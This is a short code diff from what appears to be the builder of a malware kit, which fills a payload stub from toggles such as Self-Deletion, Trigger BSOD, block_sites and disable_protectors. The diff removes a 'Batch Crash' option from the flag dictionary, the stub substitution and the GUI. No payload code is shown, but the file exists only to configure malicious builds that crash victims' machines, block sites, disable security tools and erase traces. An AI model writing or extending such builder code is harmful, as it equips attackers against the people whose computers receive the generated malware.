@@ -85,7 +85,6 @@ data_builder = {
     "rose_melt_stub": False,
     "games": False,
     "tbsod": False,
-    "bcrash": False,
     "bsites": False,
     "disableprot": False
 }
@@ -268,7 +267,6 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("rose_melt_stub = False", f"rose_melt_stub = {data_builder['rose_melt_stub']}") \
                 .replace("games = False", f"games = {data_builder['games']}") \
                 .replace("ts_bsod = False", f"ts_bsod = {data_builder['tbsod']}") \
-                .replace("bbcrash = False", f"bbcrash = {data_builder['bcrash']}") \
                 .replace("block_sites = False", f"block_sites = {data_builder['bsites']}") \
                 .replace("disable_protectors = False", f"disable_protectors = {data_builder['disableprot']}")
                 
@@ -621,8 +619,6 @@ def _features():
                 with ui.column():
                     ui.checkbox('Self-Deletion', on_change=lambda e: change_data('rose_melt_stub', e.value)).props('inline color=yellow-7')
                     ui.checkbox('Trigger BSOD', on_change=lambda e: change_data('tbsod', e.value)).props(
-                    'inline color=yellow-7')
-                    ui.checkbox('Batch Crash', on_change=lambda e: change_data('bcrash', e.value)).props(
                     'inline color=yellow-7')
 
                     with ui.row():
